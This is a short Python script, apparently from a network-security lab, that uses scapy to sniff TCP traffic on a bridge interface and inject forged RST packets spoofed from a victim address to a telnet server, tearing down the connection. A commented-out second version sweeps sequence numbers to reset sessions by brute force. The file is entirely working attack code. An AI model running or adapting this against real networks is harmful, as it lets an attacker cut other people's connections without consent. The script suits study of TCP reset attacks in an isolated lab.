#!/usr/bin/env python3
from scapy.all import *

victim_ip = "10.9.0.5"
server_ip = "10.9.0.6"
sport=49750

# seq=2805286920+52
# ack=1735014833+52


def print_pkt(pkt):
    print(pkt.show())
    print('\n\n\n\t\t\t\t====')
    ip = IP(src=victim_ip, dst=server_ip)
    tcp_len=len(pkt.getlayer(Raw).load)
    tcp = TCP(sport=sport, dport=23, flags='R', seq=pkt[TCP].seq+tcp_len, ack=pkt[TCP].ack+tcp_len) 
    pkt = ip/tcp
    ls(pkt)
    send(pkt,verbose=0)


iface='br-0a1deadc53a1'

pkt = sniff(iface=iface, filter='tcp', prn=print_pkt)

# win=512
# tcp_rst_count = 10
# your_iface = 'br-0a1deadc53a1'

# get a tcp packet by sniffing WiFi
# t = sniff(iface=your_iface, count=1,
#           lfilter=lambda x: x.haslayer(TCP)
#           and x[IP].src == victim_ip)
# t = t[0]
# tcpdata = {
#     'src': t[IP].src,
#     'dst': t[IP].dst,
#     'sport': t[TCP].sport,
#     'dport': t[TCP].dport,
#     'seq': t[TCP].seq,
#     'ack': t[TCP].ack
# }
# max_seq = tcpdata['ack'] + tcp_rst_count * win
# seqs = range(tcpdata['ack'], max_seq, int(win / 2))
# p = IP(src=tcpdata['dst'], dst=tcpdata['src']) / \
#             TCP(sport=tcpdata['dport'], dport=tcpdata['sport'],
#             flags="R", window=win, seq=seqs[0])

# for seq in seqs:
#     p.seq = seq
#     send(p, verbose=0, iface=your_iface)
#     print('tcp reset attack finish')
